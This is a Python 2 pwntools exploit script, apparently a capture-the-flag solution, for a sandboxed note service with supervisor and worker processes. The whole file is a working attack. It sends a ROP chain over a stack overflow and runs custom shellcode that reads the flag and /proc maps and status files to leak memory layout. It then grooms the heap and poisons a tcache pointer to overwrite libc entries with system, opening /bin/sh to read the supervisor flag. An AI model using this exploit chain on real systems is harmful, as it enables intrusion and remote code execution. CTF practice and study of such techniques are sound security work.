#!/usr/bin/env python2
#-*- coding: future_fstrings -*-
from pwn import *
context.arch = "amd64"
context.log_level = 20
# process("")
def debug():
    os.system('tmux split-window -h "sudo gdb -p `pidof supervisor` -ex \'ml bb 0x000000000001DD3; c\'"')
    # os.system('tmux split-window -h "sudo gdb -p `pidof supervisor` -ex \'ml bb 0x0000000000001762; bb 0x00000000000017AC; c\'"')
    
def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

def open_tmp(path, size):
    return f"""
mov rax, 2
mov rdi, {path}
mov rsi, {size}
int 3
    """

def open_any(path, size):
    return f"""
mov rax, 13
mov rdi, {path}
mov rsi, {size}
int 3
    """

def del_note(note_id):
    return f"""
mov rax, 3
mov rdi, {note_id}
int 3
    """

def read_stdin(buf, length):
    return f"""
mov rax, 100
mov rdi, {buf}
mov rsi, {length}
int 3
    """

def printer(buf, length):
    return f"""
mov rax, 101
mov rdi, {buf}
mov rsi, {length}
int 3
    """

def read_file(note_id, buf, cursize):
    return f"""
mov rax, 0
mov rdi, {note_id}
mov rsi, {buf}
mov rdx, {cursize}
int 3
    """

def write_file(note_id, buf, cursize):
    return f"""
mov rax, 1
mov rdi, {note_id}
mov rsi, {buf}
mov rdx, {cursize}
int 3
    """
    
def seek_file(note_id, offset):
    return f"""
mov rax, 4
mov rdi, {note_id}
mov rsi, {offset}
int 3
    """

def open_note(name, cache_sz):
    if len(name) > 4095:
        print "Too long"
        exit(1)
    p.sendlineafter("> ", "1")
    p.sendafter(": ", str(name))
    sleep(0.05)
    p.sendafter(": ", str(cache_sz))
    sleep(0.05)

def show_note(idx, offset):
    p.sendlineafter("> ", "2")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(offset))
    
def edit_note(idx, size, data):
    p.sendlineafter("> ", "3")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", data)

def seek_note(idx, offset):
    p.sendlineafter("> ", "4")
    p.sendlineafter(": ", str(idx))
    p.sendlineafter(": ", str(offset))

# worker
_base = 0x400000
start = _base + 0x0000000000017EE
readint = _base + 0x00000000000117F
ret = 0x401027
rbp_r = 0x401093
gadget1 = _base+0x00000000000012D3
bss = _base + 0x4000

buf = 0x404700
sc = f"""
{open_any(0x404140, 100)}
{read_file(0, buf, 0x880)}
{printer(buf, 0x880)}

// leak /proc/self/maps
{open_any(0x404160, 100)}
{read_file(1, buf, 0x900)}
{printer(buf, 0x900)}

// leak /proc/self/status
{open_any(0x404180, 100)}
{read_file(2, buf, 0x900)}
{printer(buf, 0x900)}

// leak /proc/`pidof worker`/maps
{read_stdin(0x4041A0, 0x100)}
{open_any(0x4041A0, 0x100)}
{read_file(3, buf, 0x900)}
{printer(buf, 0x900)}

// save stack addr
{read_stdin(0x4041C0, 0xA0)}
{read_stdin(buf, 0x20)}
{read_stdin("[0x4041C0]", 0x1010)}

// heap grooming
{shellcraft.pushstr("/tmp/" + randomword(10) + "111")}
{open_tmp("rsp", 0x1010)}

{read_stdin(buf, 0x90)}
{del_note(4)}
{printer(0x404180, 0x900)} // sync..

{open_tmp("[0x4041C0]", 0x40)} // heap null-byte overwrite

{read_stdin(buf, 0x90)} // [*]
{shellcraft.pushstr("/tmp/" + randomword(10) + "222")}
{open_tmp("rsp", 0x20)}
{open_tmp("rsp", 0x20)} // [!]

{read_stdin(buf, 0x100)} //
{write_file(5, buf, 0x20)}
{seek_file(5, 0)}
{read_file(5, buf, 0x20)}

{read_stdin(buf, 0x100)} // /bin/sh
{open_tmp(buf, 0x30)}

// hang
// mov rax, 100
// mov rsi, 0xf0
// int 3
"""
sc = asm(sc)
assert len(sc) < 0x600

while True:
    p = remote("172.17.0.2", 9000)

    open_note(''.join([
        p64(ret) * 500, 
        p64(readint), # [1]
        p64(rbp_r), p64(bss + 0x130), # mov byte [rbp+rax-0x1020], 0
        p64(gadget1), # [2]
    ]), "0"*8+"11")
    p.recvuntil("Error!")
    p.sendline(str(bss)) # [1]
    sleep(0.05)
        
    # sc = ['H', '\xc7', '\xc0', '\r', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '@', 'A', '@', '\x00', 'H', '\xc7', '\xc6', 'd', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', '\x80', '\x08', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'e', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x80', '\x08', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\r', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '`', 'A', '@', '\x00', 'H', '\xc7', '\xc6', 'd', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x01', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'e', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\r', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x80', 'A', '@', '\x00', 'H', '\xc7', '\xc6', 'd', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x02', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'e', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\xa0', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\x01', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\r', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\xa0', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\x01', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x03', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'e', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\xc0', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '\xa0', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', ' ', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\x8b', '<', '%', '\xc0', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '\x10', '\x10', '\x00', '\x00', '\xcc', 'h', '0', '0', '\x01', '\x01', '\x81', '4', '$', '\x01', '\x01', '\x01', '\x01', 'H', '\xb8', 'y', 'b', 'n', 'r', 'c', 't', 'g', '1', 'P', 'H', '\xb8', '/', 't', 'm', 'p', '/', 't', 'w', 'k', 'P', 'H', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', 'H', '\x89', '\xe7', 'H', '\xc7', '\xc6', '\x10', '\x10', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x90', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x03', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x04', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'e', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x80', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\t', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', 'H', '\x8b', '<', '%', '\xc0', 'A', '@', '\x00', 'H', '\xc7', '\xc6', '@', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x90', '\x00', '\x00', '\x00', '\xcc', 'h', '3', '3', '\x01', '\x01', '\x81', '4', '$', '\x01', '\x01', '\x01', '\x01', 'H', '\xb8', 'a', 'n', 'd', 'q', 'm', 'f', 'l', '2', 'P', 'H', '\xb8', '/', 't', 'm', 'p', '/', 'g', 'g', 'g', 'P', 'H', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', 'H', '\x89', '\xe7', 'H', '\xc7', '\xc6', ' ', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', 'H', '\x89', '\xe7', 'H', '\xc7', '\xc6', ' ', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\x01', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x01', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x05', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', ' ', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x04', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x05', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x00', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x05', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc2', ' ', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '\x00', '\x01', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', '\x02', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc7', '\x00', 'G', '@', '\x00', 'H', '\xc7', '\xc6', '0', '\x00', '\x00', '\x00', '\xcc', 'H', '\xc7', '\xc0', 'd', '\x00', '\x00', '\x00', 'H', '\xc7', '\xc6', '\xf0', '\x00', '\x00', '\x00', '\xcc']

    p.send(''.join([
    # [1] bss
        "A" * 0x130,
    # rbp
        p64(0xdeadbeef),
        p64(bss + 0x200),
    # bss + 0x140 = filename
        "/worker_flag.txt\x00".ljust(0x20, "C"), # [3]
        "/proc/self/maps\x00".ljust(0x20, "C"), 
        "/proc/self/status\x00".ljust(0x80, "C"), 
    # bss + 0x200 = sc
        ''.join(sc).ljust(0x500, "\xCC"),
    ])[:0xff0].ljust(0xff0, "B")) # [2]
    try:
        p.sendlineafter("cache_size", "1")
    except:
        p.close()
        continue

    p.recvuntil("Error!\n")
    worker_flag = p.recvline()
    success(f"worker flag: {worker_flag}")

    p.recvuntil("5")
    pie_base = int("5"+p.recvline().split("-")[0], 16)
    heap_base = int(p.recvuntil("[heap]").split("\n")[-1].split("-")[0], 16)
    libc_base = int(p.recvuntil("libc.so.6").split("\n")[-1].split("-")[0], 16)
    ld_base = int(p.recvuntil("ld-linux-x86-64.so.2").split("\n")[-1].split("-")[0], 16)
    stack_base = int(p.recvuntil("[stack]").split("\n")[-1].split("-")[0], 16)
    
    addr_system = libc_base + 0x50d60

    info(f"pie: {pie_base:016x}")
    info(f"heap: {heap_base:016x}")
    info(f"libc: {libc_base:016x}")
    info(f"ld: {ld_base:016x}")
    info(f"stack: {stack_base:016x}")
    
    p.recvuntil("Tgid")
    pid_supervisor = int(p.recvline().strip().split(":")[-1])
    pid_worker = pid_supervisor + 1
    info(f"super's pid: {pid_supervisor}")
    p.recvuntil("nonvoluntary_ctxt_switches")
    p.sendline(f"/proc/{pid_worker}/maps")
    p.recvuntil("/home/ctf/worker")
    worker_stack_end = int(p.recvuntil("[stack]").split("\n")[-1].split(" ")[0].split("-")[1], 16)
    
    worker_stack_base = worker_stack_end - 0x800000
    info(f"worker's stack   end {worker_stack_end:16x}")
    info(f"worker's stack begin {worker_stack_base:16x}")
    
    p.sendline(p64(worker_stack_base)), sleep(0.1)
    p.sendline("asdasd"), sleep(0.1)
    p.sendline("/tmp/" + randomword(4091)), sleep(0.1)
    
    # pause()
    p.sendline(''.join([
        "A" * 16,
        p64(0), p64(0x31),
        "X" * 32
    ]))
    p.recvuntil("/proc/self/status")
    
    # [*]
    ptr = heap_base + 0x6700
    p.sendline(''.join([
        "A" * 16,
        p64(0), p64(0x31),
        p64((ptr >> 12) ^ (libc_base + 0x0000000000219130)),  p64(0xcafecafe),
    ])), sleep(0.1) # necessary
    
    p.sendline(''.join([  # [!]
        p64(addr_system), # wcscmp
        p64(addr_system), # _dl_audit_symbind_alt
        p64(addr_system), # memmove
        p64(addr_system), # strrchr <- dirbase
    ]))
    sleep(0.1)
    p.sendline("/bin/sh\x00")
    sleep(0.1)
    
    p.sendline("id")
    p.recvuntil("(ctf)"), p.recvline()
    p.sendline("id")
    success(p.recvline())
    
    p.sendline("cd / && /supervisor_flag")
    supervisor_flag = p.recvline()
    success(f"supervisor flag: {supervisor_flag}")
    
    # debug()
    p.interactive()
    break

"""
0x401093: pop rbp ; ret ; (1 found)
"""
